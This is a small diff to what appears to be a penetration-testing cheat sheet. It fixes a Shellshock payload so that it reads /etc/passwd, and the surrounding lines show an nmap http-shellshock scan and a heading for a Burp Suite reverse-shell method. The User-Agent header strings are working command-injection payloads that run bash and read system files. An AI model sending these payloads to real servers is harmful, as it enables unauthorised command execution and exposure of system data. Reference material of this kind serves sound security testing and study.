@@ -1331,7 +1331,7 @@ nmap -sV <ip-address> --script=http-shellshock --sctipt-args "http-shellshock.ur
 
 ```HTTP
 User Agent: () { :; }; echo; echo; /bin/bash -c '<command>'
-User Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/password' 
+User Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd' 
 ```
 
 ***FOLLOWING IS THE METHOD TO GAIN A REVERSE SHELL FROM BURP SUITE***
